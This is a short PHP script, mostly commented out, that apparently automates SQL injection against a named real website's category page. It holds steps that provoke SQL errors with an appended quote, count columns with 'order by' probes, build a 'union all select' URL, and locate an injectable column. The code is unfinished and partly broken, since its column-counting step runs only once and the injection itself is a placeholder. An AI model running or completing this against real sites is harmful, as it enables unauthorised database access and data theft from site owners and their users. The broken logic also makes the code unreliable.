<?php
$url = "http://www.bible-history.com/subcat.php?id=22";
/**
 *Returns SQL error
 *	
 */
/*
function getError($url)
{
	$headers = get_headers($url,1);

	if ($headers[0] == 'HTTP/1.1 200 OK')
	{
		$errorUrl = $url . "'";

		$contents = file_get_contents($errorUrl);

		return $contents;
	}

	return NULL;
}
var_dump(getError("http://www.bible-history.com/subcat.php?id=22"));
*/
/*
 *Returns total number of columns
 *
 */
/*
$column = 1;

if ($column == 1)
{
	$orderUrl = $url . " order by " . $column;
	$column++;
	$contents = file_get_contents($orderUrl);
}

$column--;
$getRange = implode (",", range (1,$column));
$shortUrl = substr_replace($url, "" ,-2);
$getColumn = $shortUrl . "null union all select " . $getRange . "--";
var_dump($getColumn);
*/
/**
 *Returns column number that is most vulnerable to injection 
 *
 */
/*
$test = substr_replace($url, "" ,-2);
$test = $test . "null";
$contents = file_get_contents($test);
$occurence = "get first occurence to inject code into to";

if (strpos($contents, $occurence) !== FALSE)
{
	echo 'found';
	//replace $occurence with selected injection into URL
}
else
{

	echo "not found";
}
*/
?>